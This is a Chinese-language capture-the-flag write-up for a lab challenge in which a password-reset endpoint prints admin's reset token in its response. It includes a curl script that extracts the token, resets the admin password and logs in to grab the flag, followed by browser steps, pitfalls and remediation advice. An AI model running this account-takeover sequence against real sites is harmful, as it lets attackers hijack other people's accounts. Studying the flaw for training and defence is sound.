# 33-logic-reset-token · 重置 Token 泄露劫持 admin

## 题面

- 目标：`http://目标地址`
- 给了 `guest/guest123`；admin 是随机强密码
- 入口：登录表单 + 忘记密码表单
- 目标 flag：`TOGOGO-flag{...}`，仅 admin 登录后首页可见

## 漏洞本质（一句话）

**重置链接本应通过邮件外发，服务端却把 `?user=&token=` 直接打印到 HTTP 响应里**——任何人对 `username=admin` 发 `/forgot`，就拿到 admin 的一次性重置 token，从而修改密码、登录 admin。

> OWASP A04: Insecure Design / 业务逻辑漏洞——通道（邮箱）不可控就不该把敏感凭据放进同步响应里。

## 攻击三连击

| 步骤          | 请求                                                                 | 关键响应                                    |
| ------------- | -------------------------------------------------------------------- | ------------------------------------------- |
| ① 触发重置    | `POST /forgot` body `username=admin`                                 | HTML 内含 `/reset?user=admin&token=<20hex>` |
| ② 重置密码    | `POST /reset` body `user=admin&token=<上一步>&new_password=pwned123` | `password for admin reset ok`               |
| ③ 登录拿 flag | `POST /login` body `username=admin&password=pwned123`                | 首页显示 `TOGOGO-flag{...}`                 |

## 手工复刻（curl 三行版）

```bash
B=http://目标地址
# ① 拿 token（关键：Content-Type 必须是 form，否则 Flask 解析不到字段会返回 user not found）
T=$(curl -s -X POST "$B/forgot" -d "username=admin" | grep -oE 'token=[0-9a-f]+' | cut -d= -f2)
echo "token=$T"

# ② 重置 admin 密码
curl -s -X POST "$B/reset" -d "user=admin&token=$T&new_password=pwned123"

# ③ 登录并抓 flag
curl -s -c /tmp/c.j -L -X POST "$B/login" -d "username=admin&password=pwned123" \
  | grep -oE 'TOGOGO-flag\{[^}]+\}'
```

## 浏览器手工版（更直观）

1. 打开 `http://目标地址/`
2. 在「忘记密码？」表单的 username 里输入 `admin`，提交
3. 页面回显一个超链接 `/reset?user=admin&token=xxxxxxxxxxxxxxxxxxxx`——点进去
4. 在新密码框里输入 `pwned123`，提交 → 提示 reset ok
5. 回到首页，用 `admin / pwned123` 登录 → 首页就有 flag

## 一次拿到的 flag

```
TOGOGO-flag{}
```

> 注意每次部署 admin 密码不同，但 token 总是即时打印，所以本攻击是确定性的、不依赖原密码。

## 常见踩坑

| 现象                            | 根因                                                                                    | 解决                                            |
| ------------------------------- | --------------------------------------------------------------------------------------- | ----------------------------------------------- |
| `/forgot` 返回 `user not found` | 请求体没带 `Content-Type: application/x-www-form-urlencoded`，Flask 解析不到 `username` | curl 用 `-d` 默认就会带；用 raw body 时显式加头 |
| 登录后看不到 flag               | 仍是 guest 会话                                                                         | 用新 session 登录 admin，或先 `/logout`         |
| token 失效                      | 服务端可能一次性                                                                        | 重新跑一遍 `/forgot` 即可                       |

## 修复建议（让出题人看的）

1. 重置链接**只能**通过用户预留的可信通道（邮件/短信）外发，绝不在同步 HTTP 响应里回显
2. token 至少 128 bit 熵；绑定 user + 单次使用 + 短期过期（如 15 分钟）
3. `/forgot` 对存在与不存在的用户返回完全一致的响应，避免用户枚举
4. 重置成功后强制原 session 全部失效；可叠加二次验证（旧邮箱通知 / TOTP）
